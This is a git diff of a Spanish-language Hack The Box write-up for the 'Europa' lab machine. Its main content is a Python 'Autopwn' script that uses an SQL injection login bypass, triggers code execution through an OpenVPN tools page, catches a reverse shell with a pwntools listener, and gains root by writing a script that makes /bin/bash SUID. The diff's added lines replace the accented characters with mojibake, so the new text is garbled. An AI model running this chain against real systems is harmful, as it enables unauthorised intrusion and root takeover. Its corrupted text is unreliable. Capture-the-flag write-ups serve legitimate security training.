@@ -1,7 +1,6 @@
----
-layout: single
+﻿---
 title: Europa - Hack The Box
-excerpt: "Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script `Autopwn` que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn."
+excerpt: "Una mÃ¡quina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script `Autopwn` que nos habÃ­amos configurado en Python, donde tras su ejecuciÃ³n se nos automatiza la intrusiÃ³n y la escalada de privilegios mediante el uso de la librerÃ­a pwn."
 date: 2020-01-31
 classes: wide
 header:
@@ -24,11 +23,11 @@ tags:
 <img src="/assets/images/htb-writeup-europa/europa_logo.png">
 </p>
 
-Una máquina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script `Autopwn` que nos habíamos configurado en Python, donde tras su ejecución se nos automatiza la intrusión y la escalada de privilegios mediante el uso de la librería pwn.
+Una mÃ¡quina muy interesante la cual resolvemos en mi canal de YouTube. En este caso, os comparto el script `Autopwn` que nos habÃ­amos configurado en Python, donde tras su ejecuciÃ³n se nos automatiza la intrusiÃ³n y la escalada de privilegios mediante el uso de la librerÃ­a pwn.
 
-Para los interesados en la resolución de esta máquina, os dejo el enlace al vídeo que subí a mi canal:
+Para los interesados en la resoluciÃ³n de esta mÃ¡quina, os dejo el enlace al vÃ­deo que subÃ­ a mi canal:
 
-- [Máquina Europa - HackTheBox](https://www.youtube.com/watch?v=wOm4OOBLbys)
+- [MÃ¡quina Europa - HackTheBox](https://www.youtube.com/watch?v=wOm4OOBLbys)
 
 ## Script Autopwn
 
@@ -41,7 +40,7 @@ Para los interesados en la resolución de esta máquina, os dejo el enlace al v�
 import requests, sys, urllib3, signal, time, threading
 from pwn import *
 
-# Declaración de variables
+# DeclaraciÃ³n de variables
 url = "https://admin-portal.europacorp.htb/login.php"
 url_openvpn = "https://admin-portal.europacorp.htb/tools.php"
 lport = 443
@@ -64,25 +63,25 @@ def obtainShell():
   }
 
   p1 = log.progress("Login")
-  p1.status('Realizando inyección SQL')
+  p1.status('Realizando inyecciÃ³n SQL')
   time.sleep(2)
 
   r = s.post(url, data=login_data)
 
-  p1.status('Inyección SQL enviada')
+  p1.status('InyecciÃ³n SQL enviada')
   time.sleep(2)
 
   if "Dashboard" in r.text:
-   p1.success("Inyección SQL realizada con éxito")
+   p1.success("InyecciÃ³n SQL realizada con Ã©xito")
    time.sleep(1)
    log.success("Acceso al Dashboard garantizado")
    time.sleep(1)
   else:
-   p1.failure("No ha sido posible realizar la inyección SQL")
+   p1.failure("No ha sido posible realizar la inyecciÃ³n SQL")
    sys.exit()
 
-  p2 = log.progress("Explotación")
-  p2.status("Creando un nuevo fichero de configuración VPN")
+  p2 = log.progress("ExplotaciÃ³n")
+  p2.status("Creando un nuevo fichero de configuraciÃ³n VPN")
   time.sleep(2)
 
   openvpn_config_file_data = {
@@ -91,16 +90,16 @@ def obtainShell():
    'text' : 'ip_address = s4vitar'
   }
 
-  p2.status("Enviando petición al servidor")
+  p2.status("Enviando peticiÃ³n al servidor")
   time.sleep(2)
 
   r = s.post(url_openvpn, data=openvpn_config_file_data, timeout=1)
 
-  p2.success("Petición enviada con éxito")
+  p2.success("PeticiÃ³n enviada con Ã©xito")
   time.sleep(1)
 
  except requests.exceptions.ReadTimeout:
-  p2.success("Petición enviada con éxito")
+  p2.success("PeticiÃ³n enviada con Ã©xito")
   time.sleep(1)
 
  except:
@@ -117,15 +116,15 @@ if __name__ == '__main__':
  shell = listen(lport, timeout=20).wait_for_connection()
 
  if shell.sock is None:
-  log.failure("No se ha obtenido ninguna conexión")
+  log.failure("No se ha obtenido ninguna conexiÃ³n")
   sys.exit()
  else:
-  log.success("Se ha obtenido una conexión")
+  log.success("Se ha obtenido una conexiÃ³n")
   time.sleep(1)
   log.info("Acceso al sistema como usuario www-data")
   time.sleep(1)
 
- p3 = log.progress("Escalación de privilegios")
+ p3 = log.progress("EscalaciÃ³n de privilegios")
  p3.status("Creando fichero logcleared.sh en el sistema")
  time.sleep(2)
  shell.sendline("echo -e '#!/bin/bash\n\nchmod u+s /bin/bash' > /var/www/cmd/logcleared.sh; chmod +x /var/www/cmd/logcleared.sh")
